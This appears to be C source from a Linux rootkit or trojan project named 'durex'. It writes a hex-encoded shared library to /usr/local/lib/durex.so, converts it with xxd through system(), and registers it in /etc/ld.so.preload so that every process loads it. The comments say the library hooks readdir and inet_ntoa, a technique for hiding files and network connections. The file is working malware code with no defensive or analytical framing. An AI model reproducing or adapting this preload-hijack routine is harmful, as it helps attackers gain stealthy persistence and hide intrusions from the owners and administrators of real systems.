/*
**	Converting the hexadecimal in binary bytes
*/
static void			build_library(char *lib)
{
	char	build[1024];

	snprintf(build, 1023, "xxd -r -p %s %s", lib, lib);
	system((char*)&build);
}

/*
**	Set the library in the preload file on the system
*/
static void			set_library(char *lib)
{
	char	set[1024];
	char	preload_path[]	= "/etc/ld.so.preload";
	int		fd				= 0;

	unlink((char*)&preload_path);
	if ((fd = open(preload_path, O_RDWR | O_CREAT)) != -1) {
		write(fd, lib, ft_strlen(lib));
	}
}

/*
**	Creating the library file
*/
static void			create_library(char *library_path, char *raw_library)
{
	int		fd	= 0;

	if ((fd = open(library_path, O_RDWR | O_CREAT)) != -1) {
		write(fd, raw_library, ft_strlen(raw_library));
		close(fd);

		build_library(library_path);
		set_library(library_path);
	}
}

/*
**	Init the library for rewriting readdir && inet_ntoa
*/
void				init_library(t_durex *durex)
{
	char		*raw			= get_library_raw();
	char		library_path[]	= "/usr/local/lib/durex.so";

	unlink((char*)&library_path);
	create_library((char*)&library_path, raw);
	ft_strdel(&raw);
}
